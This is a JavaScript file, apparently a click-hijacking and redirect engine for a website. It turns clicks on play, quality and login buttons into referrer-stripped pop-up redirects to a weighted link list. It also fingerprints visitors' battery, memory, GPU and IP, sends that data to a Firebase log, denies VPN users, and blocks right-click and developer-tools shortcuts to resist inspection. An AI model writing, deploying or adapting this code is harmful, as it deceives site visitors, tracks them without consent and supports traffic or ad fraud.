/**
 * THE OMNI-ENGINE - MANAGER CHACHA V5.0 (DEBUG READY)
 * Main Logic: 15-Point, IP Geofencing, Firebase, 9-Click Algorithm
 */

const CHACHA_CONFIG = {
    // ٹیسٹنگ کے لیے یہ سوئچ 'true' رکھیں، فائنل کرتے وقت اسے 'false' کر دیں
    DEBUG_MODE: true, 

    LINKS: [
        "https://www.blackbox.ai/", "https://chat.deepseek.com/", "https://chatgpt.com/", 
        "https://www.theverge.com/tech", "https://tech.com.pk/", "https://techcrunch.com/", 
        "https://www.techmeme.com/", "https://rocketpay.co.in/", "https://www.api.org/", "https://www.ibm.com/",
        "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in",
        "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in"
    ],
    APIS: {
        IP_KEY: "YOUR_IP_KEY",
        FB_URL: "YOUR_FIREBASE_URL",
        TG_TOKEN: "YOUR_BOT_TOKEN",
        TG_ID: "YOUR_CHAT_ID"
    },
    SETTINGS: {
        MAX_CLICKS: 9,
        CLEAN_PAGE: "https://cloudaccesshq.xyz/limit-reached",
        DOMAIN: "cloudaccesshq.xyz"
    }
};

const _0xEngine = {
    _c: parseInt(localStorage.getItem('_m_c_')) || 0,
    _baskets: { h: [], n: [], l: [] },

    init: function() {
        // Domain Check - Bypass if Local/Debug
        if (!CHACHA_CONFIG.DEBUG_MODE && !window.location.hostname.includes(CHACHA_CONFIG.SETTINGS.DOMAIN)) return;
        
        this._baskets.h = CHACHA_CONFIG.LINKS.slice(0, 10);
        this._baskets.n = CHACHA_CONFIG.LINKS.slice(10, 16);
        this._baskets.l = CHACHA_CONFIG.LINKS.slice(16, 20);
        
        if (!CHACHA_CONFIG.DEBUG_MODE) this._lock();
    },

    _scan: async function() {
        try {
            const _bat = await navigator.getBattery().catch(() => ({ level: 1 }));
            const _ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
            
            return {
                b: Math.round(_bat.level * 100) + "%",
                r: navigator.deviceMemory || "N/A",
                g: this._gpu(),
                v: _ipData.proxy || _ipData.vpn || false,
                ip: _ipData.ip || "0.0.0.0"
            };
        } catch(e) { return { v: false }; }
    },

    _gpu: function() {
        const gl = document.createElement('canvas').getContext('webgl');
        const dbg = gl?.getExtension('WEBGL_debug_renderer_info');
        return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Std";
    },

    _jump: function(_u) {
        if(CHACHA_CONFIG.DEBUG_MODE) console.log("%c[DEBUG] Redirecting to: " + _u, "color: cyan; font-weight: bold;");
        const _w = window.open('', '_blank');
        _w.opener = null;
        _w.document.write(`<html><head><meta name="referrer" content="no-referrer"><meta http-equiv="refresh" content="0; url=${_u}"></head></html>`);
        _w.document.close();
    },

    _log: function(_id, _dna) {
        if (CHACHA_CONFIG.DEBUG_MODE) console.table(_dna);
        
        // Firebase Logging
        fetch(`${CHACHA_CONFIG.APIS.FB_URL}/logs.json`, { method: 'POST', body: JSON.stringify({ btn: _id, dna: _dna, ts: new Date().toISOString() }) });
    },

    _lock: function() {
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.onkeydown = e => { if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) return false; };
    }
};

// --- Click Logic ---
document.addEventListener('click', async (e) => {
    const _btn = e.target.closest('[id]');
    const _validIds = ['tag-btn-play-main','tag-input-message-field
', 'tag-btn-back-button', 'tag-btn-server-shift-2', 'tag-btn-q-360', 'tag-btn-q-720', 'tag-btn-q-1080', 'tag-btn-q-4k', 'tag-btn-auth-login', 'tag-btn-auth-send','tag-link-community-rules','tag-btn-community-showmore
'];

    if (_btn && _validIds.includes(_btn.id)) {
        
        // 1. 9-Click Logic Check
        if (_0xEngine._c >= CHACHA_CONFIG.SETTINGS.MAX_CLICKS) {
            if (CHACHA_CONFIG.DEBUG_MODE) {
                console.warn("[DEBUG] 9-Click Limit reached, but bypassing for test.");
            } else {
                window.location.href = CHACHA_CONFIG.SETTINGS.CLEAN_PAGE;
                return;
            }
        }

        // 2. DNA Scan (VPN/Proxy Logic)
        const _dna = await _0xEngine._scan();
        if (_dna.v && !CHACHA_CONFIG.DEBUG_MODE) {
            alert("VPN Detected! Access Denied.");
            return;
        } else if (_dna.v && CHACHA_CONFIG.DEBUG_MODE) {
            console.error("[DEBUG] VPN Detected, but bypassing for test.");
        }

        // 3. Logging
        _0xEngine._log(_btn.id, _dna);

        // 4. Algorithm (80/10/10 Logic)
        const _luck = Math.random() * 100;
        let _pool = _luck < 80 ? _0xEngine._baskets.h : (_luck < 90 ? _0xEngine._baskets.n : _0xEngine._baskets.l);
        const _finalLink = _pool[Math.floor(Math.random() * _pool.length)];

        // 5. Update Click Count
        _0xEngine._c++;
        localStorage.setItem('_m_c_', _0xEngine._c);
        
        _0xEngine._jump(_finalLink);
    }
});

_0xEngine.init();
